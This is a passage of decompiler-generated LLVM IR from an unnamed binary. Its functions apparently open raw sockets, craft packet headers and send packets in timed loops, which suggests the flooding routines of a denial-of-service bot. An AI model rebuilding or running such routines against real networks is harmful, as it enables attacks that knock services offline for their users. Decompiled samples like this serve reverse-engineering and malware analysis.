  %v3_10002034 = call i32 @function_10000e28(i16* %v2_10002034, i32 1500)
  %sext3 = mul i32 %v3_10002034, 65536
  %v1_10002038 = sdiv i32 %sext3, 65536
  %v1_10002040 = trunc i32 %v1_10002038 to i16
  store i16 %v1_10002040, i16* %v4_10002040, align 2
  %v0_10002044 = call i32 @function_1000066c()
  store i32 %v0_10002044, i32* %v3_10002050, align 4
  store i32 268443736, i32* @lr, align 4
  %v0_10002054 = call i32 @function_100086d8()
  %v1_10002064 = trunc i32 %v0_10002054 to i16
  store i16 %v1_10002064, i16* %v4_10002064, align 4
  %v3_10002074 = call i32 @function_10000e28(i16* %v2_10002034, i32 1500)
  %v1_10002080 = trunc i32 %v3_10002074 to i16
  store i16 %v1_10002080, i16* %v4_10002080, align 2
  store i32 268443832, i32* @lr, align 4
  %v6_100020b4 = call i32 @function_10007ff0(i32 %v3_10001e3c, i32 %v2_10001ee0, i32 1500, i32 0, i32 %v2_10002094, i32 16)
  %tmp34 = icmp ult i32 %stack_var_-1560.0, 50
  br i1 %tmp34, label %dec_label_pc_100020f8, label %dec_label_pc_100020c4

dec_label_pc_100020c4:                            ; preds = %dec_label_pc_10002028
  store i32 268443852, i32* @lr, align 4
  %v1_100020c8 = call i32 @function_10004d80(i32 0)
  %v2_100020e0 = icmp ult i32 %v1_100020c8, %v2_100020dc
  br i1 %v2_100020e0, label %dec_label_pc_100020f0, label %dec_label_pc_100020e8

dec_label_pc_100020e8:                            ; preds = %dec_label_pc_100020c4
  %v0_100020ec = call i32 @function_10008dd8()
  br label %dec_label_pc_100020f0

dec_label_pc_100020f0:                            ; preds = %dec_label_pc_100020c4, %dec_label_pc_100020e8
  br label %dec_label_pc_100020f8

dec_label_pc_100020f8:                            ; preds = %dec_label_pc_10002028, %dec_label_pc_100020f0
  %stack_var_-1560.1 = phi i32 [ %stack_var_-1560.0, %dec_label_pc_10002028 ], [ 0, %dec_label_pc_100020f0 ]
  %v1_100020fc = add i32 %stack_var_-1560.1, 1
  br label %dec_label_pc_10001fd4

dec_label_pc_10002108:                            ; preds = %dec_label_pc_10001de0
  ret i32 %v1_10001e20

; uselistorder directives
  uselistorder i32 %v1_10001ff8, { 1, 0 }
  uselistorder i32 %v1_10001fac, { 1, 0 }
  uselistorder i32 %v2_10001ee0, { 9, 2, 3, 4, 5, 6, 7, 8, 0, 1 }
  uselistorder i32* %stack_var_-1536, { 2, 0, 1, 3 }
  uselistorder i32* %stack_var_-1552, { 1, 0 }
  uselistorder i32 %arg2, { 1, 2, 0, 3 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_100020f8, { 1, 0 }
  uselistorder label %dec_label_pc_100020f0, { 1, 0 }
  uselistorder label %dec_label_pc_10002028, { 1, 0 }
  uselistorder label %dec_label_pc_10001e88, { 1, 0 }
  uselistorder label %dec_label_pc_10001e5c, { 1, 0 }
}

define i32 @function_10002120(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_10002120:
  %stack_var_-128 = alloca i32, align 4
  %stack_var_-148 = alloca i32, align 4
  %stack_var_-200 = alloca i32, align 4
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-180 = alloca i32, align 4
  %stack_var_-220 = alloca i32, align 4
  %stack_var_-240 = alloca i32, align 4
  %stack_var_-280 = alloca i32, align 4
  %stack_var_-112 = alloca i32, align 4
  %v2_1000214c = ptrtoint i32* %stack_var_-112 to i32
  store i32 %v2_1000214c, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_1000d8ec.83 to i32), i32* @r4, align 4
  store i32 80, i32* @r5, align 4
  store i32 ptrtoint (i32* @global_var_10002164.84 to i32), i32* @lr, align 4
  %v0_10002160 = call i32 @function_10007108()
  store i32 268444028, i32* @lr, align 4
  %v1_10002178 = call i32 @function_10004d80(i32 0)
  %v1_10002188 = call i32 @function_100004f0(i32 %arg2)
  %v3_10002190 = icmp eq i32 %v1_10002188, 0
  br i1 %v3_10002190, label %dec_label_pc_10002198, label %dec_label_pc_10002608

dec_label_pc_10002198:                            ; preds = %dec_label_pc_10002120
  %v2_1000219c = icmp sgt i32 %arg3, 2
  br i1 %v2_1000219c, label %dec_label_pc_100021c4, label %dec_label_pc_100021a4

dec_label_pc_100021a4:                            ; preds = %dec_label_pc_10002198
  %v5_100021b8 = call i32 @function_1000041c(i32 %arg1, i32 ptrtoint ([39 x i8]* @global_var_1000d93c.85 to i32), i32 %arg2, i32 ptrtoint (i32* @global_var_10010000.2 to i32))
  %v0_100021c0 = call i32 @function_10008dd8()
  br label %dec_label_pc_100021c4

dec_label_pc_100021c4:                            ; preds = %dec_label_pc_10002198, %dec_label_pc_100021a4
  store i32 268444116, i32* @lr, align 4
  %v3_100021d0 = call i32 @function_1000806c(i32 2, i32 3, i32 255)
  %tmp71 = icmp sgt i32 %v3_100021d0, -1
  br i1 %tmp71, label %dec_label_pc_10002234.preheader, label %dec_label_pc_100021e8

dec_label_pc_100021e8:                            ; preds = %dec_label_pc_100021c4
  %v0_100021ec = call i32 @function_10008dd8()
  br label %dec_label_pc_10002234.preheader

dec_label_pc_10002234.preheader:                  ; preds = %dec_label_pc_100021c4, %dec_label_pc_100021e8
  store i32 0, i32* %stack_var_-280, align 4
  %v2_10002208 = ptrtoint i32* %stack_var_-280 to i32
  %v2_1000220c = add i32 %v2_10002208, 168
  %v2_10002220 = add i32 %v2_10002208, 80
  br label %dec_label_pc_100021fc

dec_label_pc_100021fc:                            ; preds = %dec_label_pc_10002234.preheader, %dec_label_pc_100021fc
  %v3_100021fc = phi i32 [ 0, %dec_label_pc_10002234.preheader ], [ %v1_1000222c, %dec_label_pc_100021fc ]
  %v1_10002204 = mul i32 %v3_100021fc, 4
  %v1_10002210 = add i32 %v2_1000220c, %v1_10002204
  %v1_10002214 = inttoptr i32 %v1_10002210 to i32*
  %v2_10002214 = load i32, i32* %v1_10002214, align 4
  %v1_10002224 = trunc i32 %v2_10002214 to i8
  %v3_10002224 = add i32 %v2_10002220, %v3_100021fc
  %v4_10002224 = inttoptr i32 %v3_10002224 to i8*
  store i8 %v1_10002224, i8* %v4_10002224, align 1
  %v3_10002228 = load i32, i32* %stack_var_-280, align 4
  %v1_1000222c = add i32 %v3_10002228, 1
  store i32 %v1_1000222c, i32* %stack_var_-280, align 4
  %tmp72 = icmp slt i32 %v1_1000222c, 20
  br i1 %tmp72, label %dec_label_pc_100021fc, label %dec_label_pc_10002240

dec_label_pc_10002240:                            ; preds = %dec_label_pc_100021fc
  %v1_10002244 = add i32 %arg4, 4
  %v1_10002248 = inttoptr i32 %v1_10002244 to i32*
  %v2_10002248 = load i32, i32* %v1_10002248, align 4
  store i32 268444248, i32* @lr, align 4
  %v3_10002254 = call i32 @function_10001d04(i32 %arg2, i32 %v2_10002248, i32 %v1_10002244)
  %v1_10002264 = add i32 %arg4, 12
  %v1_10002268 = inttoptr i32 %v1_10002264 to i32*
  %v2_10002268 = load i32, i32* %v1_10002268, align 4
  store i32 268444276, i32* @lr, align 4
  %v2_10002270 = inttoptr i32 %v2_10002268 to i8*
  %v3_10002270 = call i32 @function_10008c10(i8* %v2_10002270, i32 %v1_10002264)
  %v2_10002284 = load i32, i32* %v1_10002248, align 4
  %v6_100022a0 = call i32 @function_1000041c(i32 %arg1, i32 ptrtoint ([24 x i8]* @global_var_1000d964.89 to i32), i32 %arg2, i32 %v2_10002284)
  %v1_100022ac = call i32 @__asm_rlwimi(i32 5, i32 28, i32 0, i32 3)
  %v1_100022bc = call i32 @__asm_rlwimi(i32 4, i32 24, i32 4, i32 7)
  store i32 %v1_100022bc, i32* %stack_var_-240, align 4
  %v1_100022f4 = call i32 @__asm_rlwimi(i32 10, i32 24, i32 4, i32 7)
  %v1_10002304 = call i32 @__asm_rlwimi(i32 0, i32 28, i32 0, i32 3)
  %v1_10002310 = call i32 @__asm_rlwinm(i32 %v1_10002304, i32 0, i32 16, i32 14)
  %v1_1000231c = call i32 @__asm_rlwinm(i32 %v1_10002310, i32 0, i32 15, i32 13)
  %v1_10002328 = call i32 @__asm_rlwinm(i32 %v1_1000231c, i32 0, i32 14, i32 12)
  %v1_10002334 = call i32 @__asm_rlwinm(i32 %v1_10002328, i32 0, i32 13, i32 11)
  %v1_10002340 = call i32 @__asm_rlwinm(i32 %v1_10002334, i32 0, i32 12, i32 10)
  %v1_1000234c = call i32 @__asm_rlwinm(i32 %v1_10002340, i32 0, i32 11, i32 9)
  %v1_10002358 = call i32 @__asm_rlwinm(i32 %v1_1000234c, i32 0, i32 9, i32 7)
  %v1_10002380 = add i32 %arg4, 8
  %v1_10002384 = inttoptr i32 %v1_10002380 to i32*
  %v2_10002384 = load i32, i32* %v1_10002384, align 4
  store i32 268444560, i32* @lr, align 4
  %v2_1000238c = inttoptr i32 %v2_10002384 to i8*
  %v3_1000238c = call i32 @function_10008c10(i8* %v2_1000238c, i32 %v1_10002380)
  %v1_10002394 = urem i32 %v3_1000238c, 65536
  store i32 %v1_10002394, i32* @r3, align 4
  %v1_1000239c = call i32 @function_100079f4(i32 %v1_10002394)
  %v2_1000247c = ptrtoint i32* %stack_var_-240 to i32
  %v2_10002488 = bitcast i32* %stack_var_-240 to i16*
  %v2_10002530 = ptrtoint i32* %stack_var_-220 to i32
  %v2_10002534 = ptrtoint i32* %stack_var_-180 to i32
  %v2_10002538 = ptrtoint i32* %stack_var_-168 to i32
  %v2_10002550 = ptrtoint i32* %stack_var_-200 to i32
  %v2_10002558 = ptrtoint i32* %stack_var_-148 to i32
  %v2_10002580 = bitcast i32* %stack_var_-180 to i16*
  %v2_10002594 = ptrtoint i32* %stack_var_-128 to i32
  %v2_100025dc = add i32 %v3_10002270, %v1_10002178
  br label %dec_label_pc_100023a8

dec_label_pc_100023a8:                            ; preds = %dec_label_pc_100025f8, %dec_label_pc_10002240
  %stack_var_-244.0 = phi i32 [ 0, %dec_label_pc_10002240 ], [ %v1_100025fc, %dec_label_pc_100025f8 ]
  store i32 268444588, i32* @lr, align 4
  %v0_100023a8 = call i32 @function_100086d8()
  %v2_100023bc = load i32, i32* %v1_10002384, align 4
  store i32 268444616, i32* @lr, align 4
  %v2_100023c4 = inttoptr i32 %v2_100023bc to i8*
  %v3_100023c4 = call i32 @function_10008c10(i8* %v2_100023c4, i32 %v1_10002380)
  %v3_100023cc = icmp eq i32 %v3_100023c4, 0
  br i1 %v3_100023cc, label %dec_label_pc_100023d4, label %dec_label_pc_100023e0

dec_label_pc_100023d4:                            ; preds = %dec_label_pc_100023a8
  store i32 268444632, i32* @lr, align 4
  %v0_100023d4 = call i32 @function_100086d8()
  br label %dec_label_pc_100023e0

dec_label_pc_100023e0:                            ; preds = %dec_label_pc_100023a8, %dec_label_pc_100023d4
  %v0_100023e0 = call i32 @function_1000066c()
  store i32 60, i32* @r3, align 4
  %v1_10002400 = call i32 @function_100079f4(i32 60)
  store i32 268444688, i32* @lr, align 4
  %v0_1000240c = call i32 @function_100086d8()
  %v1_10002438 = urem i32 %v0_100023a8, 65536
  store i32 %v1_10002438, i32* %stack_var_-220, align 4
  store i32 268444752, i32* @lr, align 4
  %v0_1000244c = call i32 @function_100086d8()
  store i32 2, i32* %stack_var_-128, align 4
  %v3_10002488 = call i32 @function_10000e28(i16* %v2_10002488, i32 20)
  store i32 268444824, i32* @lr, align 4
  %v0_10002494 = call i32 @function_100086d8()
  store i32 %v0_100023e0, i32* %stack_var_-180, align 4
  store i32 40, i32* @r3, align 4
  %v1_10002520 = call i32 @function_100079f4(i32 40)
  store i32 20, i32* @r5, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1000254c.90 to i32), i32* @lr, align 4
  %v4_10002548 = call i32 @function_10007700(i32 %v2_10002530, i32 %v2_10002538, i32 20, i32 %v2_10002534)
  store i32 20, i32* @r5, align 4
  store i32 268445036, i32* @lr, align 4
  %v4_10002568 = call i32 @function_10007700(i32 %v2_10002550, i32 %v2_10002558, i32 20, i32 %v2_10002534)
  %v3_10002580 = call i32 @function_10000e28(i16* %v2_10002580, i32 52)
  store i32 268445112, i32* @lr, align 4
  %v6_100025b4 = call i32 @function_10007ff0(i32 %v3_100021d0, i32 %v2_1000247c, i32 60, i32 0, i32 %v2_10002594, i32 16)
  %tmp73 = icmp ult i32 %stack_var_-244.0, 50
  br i1 %tmp73, label %dec_label_pc_100025f8, label %dec_label_pc_100025c4

dec_label_pc_100025c4:                            ; preds = %dec_label_pc_100023e0
  store i32 268445132, i32* @lr, align 4
  %v1_100025c8 = call i32 @function_10004d80(i32 0)
  %v2_100025e0 = icmp ult i32 %v1_100025c8, %v2_100025dc
  br i1 %v2_100025e0, label %dec_label_pc_100025f0, label %dec_label_pc_100025e8

dec_label_pc_100025e8:                            ; preds = %dec_label_pc_100025c4
  %v0_100025ec = call i32 @function_10008dd8()
  br label %dec_label_pc_100025f0

dec_label_pc_100025f0:                            ; preds = %dec_label_pc_100025c4, %dec_label_pc_100025e8
  br label %dec_label_pc_100025f8

dec_label_pc_100025f8:                            ; preds = %dec_label_pc_100023e0, %dec_label_pc_100025f0
  %stack_var_-244.1 = phi i32 [ %stack_var_-244.0, %dec_label_pc_100023e0 ], [ 0, %dec_label_pc_100025f0 ]
  %v1_100025fc = add i32 %stack_var_-244.1, 1
  br label %dec_label_pc_100023a8

dec_label_pc_10002608:                            ; preds = %dec_label_pc_10002120
  ret i32 %v1_10002188

; uselistorder directives
  uselistorder i32 %v2_10002534, { 1, 0 }
  uselistorder i32 %v1_10002394, { 1, 0 }
  uselistorder i32 %v1_1000222c, { 1, 2, 0 }
  uselistorder i32 %v3_100021fc, { 1, 0 }
  uselistorder i32* %stack_var_-280, { 1, 2, 3, 0 }
  uselistorder i32* %stack_var_-240, { 0, 2, 1 }
  uselistorder i32* %stack_var_-180, { 1, 0, 2 }
  uselistorder i32 60, { 2, 4, 3, 6, 1, 7, 8, 0, 5 }
  uselistorder i32 %arg2, { 1, 2, 0, 3 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_100025f8, { 1, 0 }
  uselistorder label %dec_label_pc_100025f0, { 1, 0 }
  uselistorder label %dec_label_pc_100023e0, { 1, 0 }
  uselistorder label %dec_label_pc_100021fc, { 1, 0 }
  uselistorder label %dec_label_pc_10002234.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_100021c4, { 1, 0 }
}

define i32 @function_10002620(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_10002620:
  %tmp11 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-76 = alloca i32, align 4
  %stack_var_-96 = alloca i32, align 4
  %stack_var_-108 = alloca i32, align 4
  %stack_var_-148 = alloca i32, align 4
  %stack_var_-128 = alloca i32, align 4
  %stack_var_-168 = alloca i32, align 4
  store i32 268445272, i32* @lr, align 4
  %v1_10002654 = call i32 @function_10004d80(i32 0)
  %v1_10002664 = call i32 @function_100004f0(i32 %arg2)
  %v3_1000266c = icmp eq i32 %v1_10002664, 0
  br i1 %v3_1000266c, label %dec_label_pc_10002674, label %dec_label_pc_10002a44

dec_label_pc_10002674:                            ; preds = %dec_label_pc_10002620
  %v2_10002678 = icmp sgt i32 %arg3, 1
  br i1 %v2_10002678, label %dec_label_pc_100026a0, label %dec_label_pc_10002680

dec_label_pc_10002680:                            ; preds = %dec_label_pc_10002674
  %v5_10002694 = call i32 @function_1000041c(i32 %arg1, i32 ptrtoint ([36 x i8]* @global_var_1000d97c.92 to i32), i32 %arg2, i32 ptrtoint (i32* @global_var_10010000.2 to i32))
  %v0_1000269c = call i32 @function_10008dd8()
  br label %dec_label_pc_100026a0

dec_label_pc_100026a0:                            ; preds = %dec_label_pc_10002674, %dec_label_pc_10002680
  %v1_100026a4 = add i32 %arg4, 8
  %v1_100026a8 = inttoptr i32 %v1_100026a4 to i32*
  %v2_100026a8 = load i32, i32* %v1_100026a8, align 4
  store i32 268445364, i32* @lr, align 4
  %v2_100026b0 = inttoptr i32 %v2_100026a8 to i8*
  %v3_100026b0 = call i32 @function_10008c10(i8* %v2_100026b0, i32 %v1_100026a4)
  store i32 268445388, i32* @lr, align 4
  %v3_100026c8 = call i32 @function_1000806c(i32 2, i32 3, i32 255)
  %tmp60 = icmp sgt i32 %v3_100026c8, -1
  br i1 %tmp60, label %dec_label_pc_100026e8, label %dec_label_pc_100026e0

dec_label_pc_100026e0:                            ; preds = %dec_label_pc_100026a0
  %v0_100026e4 = call i32 @function_10008dd8()
  br label %dec_label_pc_100026e8

dec_label_pc_100026e8:                            ; preds = %dec_label_pc_100026a0, %dec_label_pc_100026e0
  store i32 268445424, i32* @lr, align 4
  %v1_100026ec = call i32 @function_10004d80(i32 0)
  store i32 268445432, i32* @lr, align 4
  %v0_100026f4 = call i32 @function_10004c60()
  %v2_100026fc = xor i32 %v1_100026ec, %v0_100026f4
  store i32 ptrtoint (i32* @global_var_10002708.95 to i32), i32* @lr, align 4
  %v1_10002704 = call i32 @function_10008854(i32 %v2_100026fc)
  store i32 268445452, i32* @lr, align 4
  %v0_10002708 = call i32 @function_100086d8()
  %v2_10002710 = ptrtoint i32* %stack_var_-168 to i32
  %v2_10002714 = ptrtoint i32* %stack_var_-128 to i32
  store i32 268445480, i32* @lr, align 4
  %v3_10002724 = call i32 @function_100071a4(i32 %v2_10002714, i32 %v0_10002708, i32 1400)
  %v1_1000272c = add i32 %arg4, 4
  %v1_10002730 = inttoptr i32 %v1_1000272c to i32*
  %v2_10002730 = load i32, i32* %v1_10002730, align 4
  store i32 268445504, i32* @lr, align 4
  %v3_1000273c = call i32 @function_10001d04(i32 %arg2, i32 %v2_10002730, i32 %v1_1000272c)
  %v2_10002750 = load i32, i32* %v1_10002730, align 4
  %v6_1000276c = call i32 @function_1000041c(i32 %arg1, i32 ptrtoint ([36 x i8]* @global_var_1000d9a0.96 to i32), i32 %arg2, i32 %v2_10002750)
  %v2_100028fc = bitcast i32* %stack_var_-168 to i16*
  %v2_10002964 = ptrtoint i32* %stack_var_-148 to i32
  %v2_10002968 = ptrtoint i32* %stack_var_-108 to i32
  %v2_1000296c = ptrtoint i32* %stack_var_-96 to i32
  %v2_1000298c = ptrtoint i32* %stack_var_-76 to i32
  %v2_100029b4 = bitcast i32* %stack_var_-108 to i16*
  %v2_100029c8 = ptrtoint i32* %stack_var_-56 to i32
  %v2_10002a10 = add i32 %v3_100026b0, %v1_10002654
  br label %dec_label_pc_10002770

dec_label_pc_10002770:                            ; preds = %dec_label_pc_10002a24, %dec_label_pc_100026e8
  %stack_var_-180.0 = phi i32 [ %tmp11, %dec_label_pc_100026e8 ], [ %v1_10002a28, %dec_label_pc_10002a24 ]
  %v0_10002770 = call i32 @function_1000066c()
  %v1_10002784 = call i32 @__asm_rlwimi(i32 5, i32 28, i32 0, i32 3)
  store i32 %v1_10002784, i32* %stack_var_-168, align 4
  %v1_10002794 = call i32 @__asm_rlwimi(i32 4, i32 24, i32 4, i32 7)
  store i32 %v1_10002794, i32* %stack_var_-168, align 4
  store i32 1440, i32* @r3, align 4
  %v1_100027b8 = call i32 @function_100079f4(i32 1440)
  store i32 268445640, i32* @lr, align 4
  %v0_100027c4 = call i32 @function_100086d8()
  store i32 268445704, i32* @lr, align 4
  %v0_10002804 = call i32 @function_100086d8()
  %v1_1000280c = urem i32 %v0_10002804, 65536
  store i32 %v1_1000280c, i32* %stack_var_-148, align 4
  store i32 268445720, i32* @lr, align 4
  %v0_10002814 = call i32 @function_100086d8()
  store i32 268445736, i32* @lr, align 4
  %v0_10002824 = call i32 @function_100086d8()
  store i32 268445748, i32* @lr, align 4
  %v0_10002830 = call i32 @function_100086d8()
  %v1_10002844 = call i32 @__asm_rlwimi(i32 5, i32 24, i32 4, i32 7)
  %v1_10002854 = call i32 @__asm_rlwimi(i32 0, i32 28, i32 0, i32 3)
  %v1_10002860 = call i32 @__asm_rlwinm(i32 %v1_10002854, i32 0, i32 16, i32 14)
  %v1_1000286c = call i32 @__asm_rlwinm(i32 %v1_10002860, i32 0, i32 15, i32 13)
  %v1_10002878 = call i32 @__asm_rlwinm(i32 %v1_1000286c, i32 0, i32 14, i32 12)
  %v1_10002890 = or i32 %v1_10002878, 1572864
  %v1_1000289c = call i32 @__asm_rlwinm(i32 %v1_10002890, i32 0, i32 11, i32 9)
  %v1_100028a8 = call i32 @__asm_rlwinm(i32 %v1_1000289c, i32 0, i32 9, i32 7)
  %v1_100028b4 = call i32 @__asm_rlwinm(i32 %v1_100028a8, i32 0, i32 10, i32 8)
  store i32 2, i32* %stack_var_-56, align 4
  %v3_100028fc = call i32 @function_10000e28(i16* %v2_100028fc, i32 20)
  %v3_10002914 = call i32 @function_10000e28(i16* %v2_100028fc, i32 40)
  store i32 %v0_10002770, i32* %stack_var_-108, align 4
  store i32 1420, i32* @r3, align 4
  %v1_10002954 = call i32 @function_100079f4(i32 1420)
  store i32 20, i32* @r5, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10002980.97 to i32), i32* @lr, align 4
  %v4_1000297c = call i32 @function_10007700(i32 %v2_10002964, i32 %v2_1000296c, i32 20, i32 %v2_10002968)
  store i32 1400, i32* @r5, align 4
  store i32 268446112, i32* @lr, align 4
  %v4_1000299c = call i32 @function_10007700(i32 %v2_10002714, i32 %v2_1000298c, i32 1400, i32 %v2_10002968)
  %v3_100029b4 = call i32 @function_10000e28(i16* %v2_100029b4, i32 1432)
  store i32 268446188, i32* @lr, align 4
  %v6_100029e8 = call i32 @function_10007ff0(i32 %v3_100026c8, i32 %v2_10002710, i32 1440, i32 0, i32 %v2_100029c8, i32 16)
  %tmp61 = icmp ult i32 %stack_var_-180.0, 50
  br i1 %tmp61, label %dec_label_pc_10002a24, label %dec_label_pc_100029f8

dec_label_pc_100029f8:                            ; preds = %dec_label_pc_10002770
  store i32 268446208, i32* @lr, align 4
  %v1_100029fc = call i32 @function_10004d80(i32 0)
  %v2_10002a14 = icmp ult i32 %v1_100029fc, %v2_10002a10
  br i1 %v2_10002a14, label %dec_label_pc_10002a1c, label %dec_label_pc_10002a34

dec_label_pc_10002a1c:                            ; preds = %dec_label_pc_100029f8
  br label %dec_label_pc_10002a24

dec_label_pc_10002a24:                            ; preds = %dec_label_pc_10002770, %dec_label_pc_10002a1c
  %stack_var_-180.1 = phi i32 [ %stack_var_-180.0, %dec_label_pc_10002770 ], [ 0, %dec_label_pc_10002a1c ]
  %v1_10002a28 = add i32 %stack_var_-180.1, 1
  br label %dec_label_pc_10002770

dec_label_pc_10002a34:                            ; preds = %dec_label_pc_100029f8
  store i32 ptrtoint ([3 x i8]* @global_var_10002a3c.98 to i32), i32* @lr, align 4
  %v1_10002a38 = call i32 @function_10004ab4(i32 %v3_100026c8)
  %v0_10002a40 = call i32 @function_10008dd8()
  br label %dec_label_pc_10002a44

dec_label_pc_10002a44:                            ; preds = %dec_label_pc_10002620, %dec_label_pc_10002a34
  %v0_10002a5c = phi i32 [ %v1_10002664, %dec_label_pc_10002620 ], [ %v0_10002a40, %dec_label_pc_10002a34 ]
  ret i32 %v0_10002a5c

; uselistorder directives
  uselistorder i32 %v2_10002968, { 1, 0 }
  uselistorder i32 %v2_10002714, { 1, 0 }
  uselistorder i32* %stack_var_-168, { 1, 2, 0, 3 }
  uselistorder i32* %stack_var_-108, { 1, 0, 2 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @function_10007ff0, { 2, 1, 0 }
  uselistorder i32 1420, { 1, 0 }
  uselistorder i32 1440, { 0, 2, 1 }
  uselistorder i32 ()* @function_1000066c, { 2, 1, 0 }
  uselistorder i32 (i32, i32, i32)* @function_10001d04, { 2, 1, 0 }
  uselistorder i32 1400, { 1, 0, 2 }
  uselistorder i32 (i32)* @function_100004f0, { 3, 2, 1, 0 }
  uselistorder i32 %arg2, { 1, 2, 0, 3 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_10002a44, { 1, 0 }
  uselistorder label %dec_label_pc_10002a24, { 1, 0 }
  uselistorder label %dec_label_pc_100026e8, { 1, 0 }
  uselistorder label %dec_label_pc_100026a0, { 1, 0 }
}

define i32 @function_100037d8(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_100037d8:
  %v3_100037fc = load i32, i32* @global_var_10010474.145, align 4
  %v5_10003814 = call i32 @function_1000041c(i32 %arg1, i32 ptrtoint ([13 x i8]* @global_var_1000e16c.158 to i32), i32 %v3_100037fc, i32 ptrtoint (i32* @global_var_10010000.2 to i32))
  %v3_1000381c = load i32, i32* @global_var_10010488.143, align 4
  %v3_10003824 = load i32, i32* @global_var_10010484.159, align 4
  %v6_10003840 = call i32 @function_1000041c(i32 %arg1, i32 ptrtoint ([13 x i8]* @global_var_1000e17c.160 to i32), i32 %v3_1000381c, i32 %v3_10003824)
  %v3_10003848 = load i32, i32* @global_var_10010474.145, align 4
  %v5_10003860 = call i32 @function_1000041c(i32 %arg1, i32 ptrtoint ([8 x i8]* @global_var_1000e18c.161 to i32), i32 %v3_10003848, i32 ptrtoint (i32* @global_var_10010000.2 to i32))
  ret i32 %v5_10003860
}

define i32 @function_1000387c(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_1000387c:
  %v5_100038b0 = call i32 @function_1000041c(i32 %arg1, i32 ptrtoint ([9 x i8]* @global_var_1000e194.162 to i32), i32 %arg3, i32 ptrtoint (i32* @global_var_10010000.2 to i32))
  ret i32 %v5_100038b0
}

define i32 @function_100038cc(i32 %arg1, i32 %arg2, i8* %arg3) local_unnamed_addr {
dec_label_pc_100038cc:
  %r29.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg3 to i32
  %stack_var_-56 = alloca i8, align 1
  %stack_var_-80 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v4_100038cc = ptrtoint i32* %stack_var_0 to i32
  store i32 %v4_100038cc, i32* %stack_var_-80, align 4
  br label %dec_label_pc_10003924.preheader

dec_label_pc_1000390c:                            ; preds = %dec_label_pc_1000393c
  %v4_1000393c = ptrtoint i8* %stack_var_-68.057 to i32
  %v1_10003910 = add i32 %v4_1000393c, 1
  %v5_10003914 = inttoptr i32 %v1_10003910 to i8*
  %v1_1000391c = add i32 %stack_var_-60.056, 1
  store i32 %v1_1000391c, i32* %r29.global-to-local, align 4
  store i32 %tmp, i32* @r3, align 4
  %v0_1000392c = call i32 @function_10007288()
  %v0_10003934 = load i32, i32* %r29.global-to-local, align 4
  %v2_10003934 = icmp ult i32 %v0_10003934, %v0_1000392c
  br i1 %v2_10003934, label %dec_label_pc_1000393c, label %dec_label_pc_10003950

dec_label_pc_1000393c:                            ; preds = %dec_label_pc_10003924.preheader, %dec_label_pc_1000390c
  %stack_var_-68.057 = phi i8* [ %v5_10003914, %dec_label_pc_1000390c ], [ %stack_var_-68.163, %dec_label_pc_10003924.preheader ]
  %stack_var_-60.056 = phi i32 [ %v1_1000391c, %dec_label_pc_1000390c ], [ %stack_var_-60.162, %dec_label_pc_10003924.preheader ]
  %v2_10003940 = load i8, i8* %stack_var_-68.057, align 1
  %v3_10003948 = icmp eq i8 %v2_10003940, 32
  br i1 %v3_10003948, label %dec_label_pc_10003950, label %dec_label_pc_1000390c

dec_label_pc_10003950:                            ; preds = %dec_label_pc_1000390c, %dec_label_pc_1000393c, %dec_label_pc_10003924.preheader
  %stack_var_-60.0.lcssa = phi i32 [ %stack_var_-60.162, %dec_label_pc_10003924.preheader ], [ %v1_1000391c, %dec_label_pc_1000390c ], [ %stack_var_-60.056, %dec_label_pc_1000393c ]
  %stack_var_-68.0.lcssa = phi i8* [ %stack_var_-68.163, %dec_label_pc_10003924.preheader ], [ %v5_10003914, %dec_label_pc_1000390c ], [ %stack_var_-68.057, %dec_label_pc_1000393c ]
  %v4_10003950 = ptrtoint i8* %stack_var_-68.0.lcssa to i32
  %v1_10003954 = add i32 %v4_10003950, 1
  store i32 %stack_var_-60.0.lcssa, i32* %r29.global-to-local, align 4
  store i32 %tmp, i32* @r3, align 4
  %v0_10003964 = call i32 @function_10007288()
  %v0_1000396c = load i32, i32* %r29.global-to-local, align 4
  %v4_1000396c = icmp eq i32 %v0_1000396c, %v0_10003964
  br i1 %v4_1000396c, label %dec_label_pc_10003c2c, label %dec_label_pc_10003974

dec_label_pc_10003974:                            ; preds = %dec_label_pc_10003950
  %v5_10003958 = inttoptr i32 %v1_10003954 to i8*
  %v1_10003978 = add nuw nsw i32 %storemerge864, 1
  %tmp91 = icmp slt i32 %v1_10003978, 5
  br i1 %tmp91, label %dec_label_pc_10003924.preheader, label %dec_label_pc_100039a4.preheader

dec_label_pc_10003924.preheader:                  ; preds = %dec_label_pc_100038cc, %dec_label_pc_10003974
  %storemerge864 = phi i32 [ 0, %dec_label_pc_100038cc ], [ %v1_10003978, %dec_label_pc_10003974 ]
  %stack_var_-68.163 = phi i8* [ %arg3, %dec_label_pc_100038cc ], [ %v5_10003958, %dec_label_pc_10003974 ]
  %stack_var_-60.162 = phi i32 [ 0, %dec_label_pc_100038cc ], [ %stack_var_-60.0.lcssa, %dec_label_pc_10003974 ]
  store i32 %stack_var_-60.162, i32* %r29.global-to-local, align 4
  store i32 %tmp, i32* @r3, align 4
  %v0_1000392c51 = call i32 @function_10007288()
  %v0_1000393452 = load i32, i32* %r29.global-to-local, align 4
  %v2_1000393453 = icmp ult i32 %v0_1000393452, %v0_1000392c51
  br i1 %v2_1000393453, label %dec_label_pc_1000393c, label %dec_label_pc_10003950

dec_label_pc_100039a4.preheader:                  ; preds = %dec_label_pc_10003974
  store i32 0, i32* %r29.global-to-local, align 4
  store i32 %v1_10003954, i32* @r3, align 4
